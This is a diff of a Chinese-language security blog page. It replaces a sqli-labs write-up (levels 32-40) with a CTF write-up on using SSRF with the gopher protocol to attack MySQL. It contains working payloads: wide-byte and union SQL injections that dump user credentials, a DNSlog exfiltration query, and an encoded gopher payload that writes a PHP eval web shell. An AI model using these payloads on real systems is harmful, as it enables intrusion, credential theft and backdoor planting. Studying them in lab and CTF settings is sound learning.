@@ -6,19 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>less32-40 | Welcome to my blogs!</title>
+  <title>记一次ssrf漏洞gopher对mysql的攻击 | Welcome to my blogs!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="less-32（宽字节注入）">
+  <meta name="description" content="记一次靶场ssrf实战">
 <meta property="og:type" content="article">
-<meta property="og:title" content="less32-40">
-<meta property="og:url" content="http://yoursite.com/2020/10/25/less32-40/index.html">
+<meta property="og:title" content="记一次ssrf漏洞gopher对mysql的攻击">
+<meta property="og:url" content="http://yoursite.com/2020/10/31/记一次ssrf漏洞gopher对mysql的攻击/index.html">
 <meta property="og:site_name" content="Welcome to my blogs!">
-<meta property="og:description" content="less-32（宽字节注入）">
+<meta property="og:description" content="记一次靶场ssrf实战">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-10-25T12:50:11.076Z">
+<meta property="og:image" content="http://yoursite.com/image/ssrfp.png">
+<meta property="og:image" content="http://yoursite.com/image/ssrfzb.png">
+<meta property="og:image" content="http://yoursite.com/image/ssrf1.png">
+<meta property="og:image" content="http://yoursite.com/image/make.png">
+<meta property="og:image" content="http://yoursite.com/image/ssrf2.png">
+<meta property="og:updated_time" content="2020-10-31T16:05:27.686Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="less32-40">
-<meta name="twitter:description" content="less-32（宽字节注入）">
+<meta name="twitter:title" content="记一次ssrf漏洞gopher对mysql的攻击">
+<meta name="twitter:description" content="记一次靶场ssrf实战">
+<meta name="twitter:image" content="http://yoursite.com/image/ssrfp.png">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to my blogs!" type="application/atom+xml">
   
@@ -154,135 +160,110 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-less32-40" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-记一次ssrf漏洞gopher对mysql的攻击" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      less32-40
+      记一次ssrf漏洞gopher对mysql的攻击
     </h1>
   
 
         
-        <a href="/2020/10/25/less32-40/" class="archive-article-date">
-  	<time datetime="2020-10-25T12:37:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-25</time>
+        <a href="/2020/10/31/记一次ssrf漏洞gopher对mysql的攻击/" class="archive-article-date">
+  	<time datetime="2020-10-31T15:47:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3>less-32（宽字节注入）</h3>
+        <h1>记一次靶场ssrf实战</h1>
 <a id="more"></a>
+
+<h3>ssrf</h3>
 <p>
-查看源码
-if(isset($_GET['id']))
-$id=check_addslashes($_GET['id']);
-
-</p><h1 id="在’-“-等敏感字符前面添加反斜杠"><a href="#在’-“-等敏感字符前面添加反斜杠" class="headerlink" title="在’ “ \ 等敏感字符前面添加反斜杠"></a>在’ “ \ 等敏感字符前面添加反斜杠</h1><p>function check_addslashes($string)<br>{        # \ 转换为 \<br>    $string = preg_replace(‘/‘. preg_quote(‘\‘) .’/‘, “\\\“, $string);          将       # 将 ‘ 转为&quot;<br>    $string = preg_replace(‘/&#39;/i’, ‘\&#39;‘, $string);<br>      # 将 “ 转为&quot;<br>    $string = preg_replace(‘/&quot;/‘, “\&quot;“, $string);<br>    return $string;</p>
-<p>}</p>
-<p>用%df 吃掉 源码里的\，<br>payload：<br>?id=-1%df’ union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)–+</p>
-<p></p>
-
-<h3>less-33</h3>
-<p>
-也是和less-32一样</p>
-
-<h3>less-34</h3>
-<p>
-POST型的注入,转义方式和less-33一样
-
-</p><p>将UTF-8转换为UTF-16或者UTF-32,例如将’转换为utf-16为： �’。我们可以利用这一点注入。</p>
-<p>使用�’ or 1=1#</p>
-<p></p>
-
-<h3>less-35</h3>
-<p>
-有点简单
-payload
-?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ 
+一般情况下，攻击的目标是外网无法访问的内部系统
 </p>
-
-<h3>less-36</h3>
 <p>
-用之前的方法依旧可行
-payload
-?id=-1%df' union select 1,2,database() --+
-或者
-
-</p><p>Payload<br>?id=-1�’ union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) –+ </p>
-<p></p>
-
-<h3>less-37</h3>
-<p>
-与less-36一样
+攻击者利用ssrf可以实现的攻击主要有5种：
+1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;
+2.攻击运行在内网或本地的应用程序（比如溢出）;
+3.对内网web应用进行指纹识别，通过访问默认文件实现;
+4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;
+5.利用file协议读取本地文件等。
 </p>
+<a href="https://ctf.show/challenges" target="_blank" rel="noopener">靶场地址</a>
+题目如下：
 
-<h4>在进入less-38前对一些知识了解<h4>
+<p><img src="/image/ssrfp.png" alt></p>
+<p>
+题目给出的信息端口3306为链接mysql的端口</p>
+<p>想法1：尝试sql注入看看是否存在漏洞,结果没啥反应</p>
+<p>想法2：抓个包看看是什么东西</p>
 
-<p>什么是UNC路径？</p><p>
-</p><p>
-U/C路径就是类似\\softer这样的形式的网络路径
+<p><img src="/image/ssrfzb.png" alt></p>
+<p>
+发现这个奇怪的东西，疑似ssrf，送到repeater，修改u=1%27+or+1%3D2%23&returl=http://www.baidu.com
+发现回显为百度的界面，可以初步确定是ssrf
+进一步确定的话，就在自己的服务器开启监听端口，nc -lvvp 1000(端口随便开)
+u=1%27+or+1%3D2%23&returl=自己服务器地址:1000
+自己服务器会得到监听信息，如此可进一步确定是ssrf漏洞</p>
+
+<p><img src="/image/ssrf1.png" alt></p>
+<p>
+又因为给出3306端口，又是ssrf漏洞，去谷歌ssrf mysql
+由于自己菜，得膜拜一下大佬的blogs</p>
+<p>
+两个blog：    https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/
+            https://www.codenong.com/jsa5ceccfa279a/
+            https://xz.aliyun.com/t/6993
 </p>
+<h3>
+补一波make的基本用法</h3>
+<p>make是一个Linux下的二进制程序，用来处理Makefile这种文本文件。</p>
 
-<p>bnslog参考链接：</p>
-<a href="http://dnslog.cn/" target="_blank" rel="noopener">
-http://dnslog.cn/</a>
-<a href="http://ceye.io" target="_blank" rel="noopener">
-http://ceye.io</a>
-<p>
-（头疼）
-DNSlog注入产生
-测试一些网站的时候，一些注入都是无回显的，可以通过写脚本来进行盲注，但有些网站会ban掉我们的ip，
-可以通过设置ip代理池解决，但是盲注往往效率很低，所以产生了DNSlog注入。
-
-</p><p>DNSlog注入应用场景<br>sql注入的盲注、无回显的命令执行、无回显的SSRF</p>
-<p>DNSlog注入原理<br>有一个可以配置的域名(比如：ceye.io)，然后通过代理商设置域名(ceye.io)的 nameserver 为自己的服务器 A，<br>然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，</p>
-<p>DNSlog需要条件：<br>MySQL 开启 load_file()<br>DNSLog 平台 （Hyuga、CEYE）<br>Windows 平台</p>
-<p>dnslog payload(我失败了)：<br>?id=1’;select load_file(concat(‘\\‘,(select hex(concat_ws(‘~’,username,password)) from users limit 0,1),’.gvc791.ceye.io\abc’))–+</p>
-<p></p>
-<p>然后在：</p><a href="http://www.soolco.com/post/68806_1_1.html" target="_blank" rel="noopener">http://www.soolco.com/post/68806_1_1.html</a>
-<br>
-          <a href="https://codingnote.cc/zh-tw/p/113368/" target="_blank" rel="noopener">https://codingnote.cc/zh-tw/p/113368/</a>
-<p>解释的很好（对我个人来说）</p>
-<p>
-堆叠注入
-MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，
-如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。
-如：select * from users where id = 1;select version();
-
-</p><p>局限性<br>1、并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。<br>2、在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</p>
-<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，<br>我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
-<p></p>
-<h3>less-38</h3>
-
-<p>
-以前的源码
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-$result=mysql_query($sql);
-
-</p><p>变成了现在的：<br>Php<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>if (mysqli_multi_query($con1, $sql))</p>
-<p>mysqli_multi_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。<br>这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。<br>因为执行sql语句时使用了mysqli_multi_query()函数，才使我们能够使用堆叠查询。</p>
-<p>union<br>?id=-1’ union select 1,version(),database() –+</p>
-<p>堆叠<br>?id=1’;insert into users(username,password) values (‘hello’,’world’);<br>添加字段值<br>insert into users(username,password) values (‘hello’,’world’);<br>这个倒是看明白了，但是 国光的其它注入倒是不怎么明白</p>
-<p>噢。第一条语句才是会回显的第二条是不回显的</p>
-<p></p>
-
-<h3>less-39</h3>
-<p>
-与less-38一样
+<p><img src="/image/make.png" alt></p>
+<p>用到的工具sec_tools:<a href="https://github.com/firebroo/sec_tools" target="_blank" rel="noopener">https://github.com/firebroo/sec_tools</a></p>
+<h3>补一补rce</h3>
+<p>远程命令执行 英文名称：RCE (remote code execution) ，简称RCE漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。
 </p>
-
-
-<h3>less-40</h3>
 <p>
-用万能语句套进去
-payload
-?id=1') and 1=2 union select 1,2,database() --+
+在开过程中遇到这个问题MySQL----ERROR-1698-(28000):-Access-denied-for-user-'root'@'localhost'</p>
+<p>
+解决：
+您可以将root用户设置为使用mysql_native_password插件。您可以使用system_user创建一个新的db_user（推荐）
+$ sudo mysql -u root # I had to use "sudo" since is new installation
 </p>
-</h4></h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; USE mysql;</span><br><span class="line">mysql&gt; UPDATE user SET plugin=&apos;mysql_native_password&apos; WHERE User=&apos;root&apos;;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt; exit;</span><br><span class="line">$ service mysql restart</span><br></pre></td></tr></table></figure>
+<h3>
+补gopher协议在ssrf中的利用</h3>
+参考链接：https://xz.aliyun.com/t/6993
+
+<h3>准备好工具开始攻击</h3>
+<p>
+步骤：
+</p><p>1、在kali开启mysql服务： sudo service mysql start</p>
+<p>2、打开写入文件的权限：chmod -R 777 /var</p>
+<p>3、使用命令./sniffer -p3306 监听网卡</p>
+<p>4、然后需要本地搭建msyql服务，执行如下命令测试
+    mysql -u root -h 127.0.0.1</p>
+<p>6、执行：select '<?php eval($_POST[pass]);?>' INTO OUTFILE '/var/www/html/4.php';</p>
+
+<p>5、得到payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%ba%00%00%01%84%a6%9f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%07%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%7d%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%0a%6c%69%62%6d%61%72%69%61%64%62%04%5f%70%69%64%04%31%36%39%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%05%33%2e%31%2e%35%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%5f%73%65%72%76%65%72%5f%68%6f%73%74%09%31%32%37%2e%30%2e%30%2e%31%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%48%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%34%2e%70%68%70%27</span><br></pre></td></tr></table></figure>
+（值得注意的是payload需要再一次进行url编码）
+<p>6、结果</p>
+
+<p><img src="/image/ssrf2.png" alt></p>
+<h2>总结：</h2>
+<p>
+1、对确定到底是不是ssrf漏洞挺重要的。因为题目乍一看，感觉是sql漏洞，通过抓包发现疑似ssrf，需要用自己的服务器（vps）检验，确定是什么漏洞很重要！
+2、发现自己如果单纯就知道什么是ssrf原理不行，像这道题ssrf+mysql就不单单ssrf原理可以解决的，kali搭建web服务权限、连接的问题，像gopher协议、flie协议都要用到，sec_tools工具的应用，包括其中遇到的各种问题。其实都增长了自己的经验
+3、通过这次的ssrf实战，学习了gopher、file协议，怎么确定是否为ssrf，ssrf+mysql、redis的攻击方法，总之是一个不错的实战经验
+</p>
       
 
       
@@ -361,7 +342,7 @@ payload
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/25/less32-40/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/31/记一次ssrf漏洞gopher对mysql的攻击/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -375,18 +356,9 @@ payload
   
 <nav id="article-nav">
   
-    <a href="/2020/10/31/记一次ssrf漏洞gopher对mysql的攻击/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          记一次ssrf漏洞gopher对mysql的攻击
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/10/25/less20-31/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">less20-31</div>
+    <a href="/2020/10/25/less32-40/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">less32-40</div>
       <i class="icon-circle-right"></i>
     </a>
   
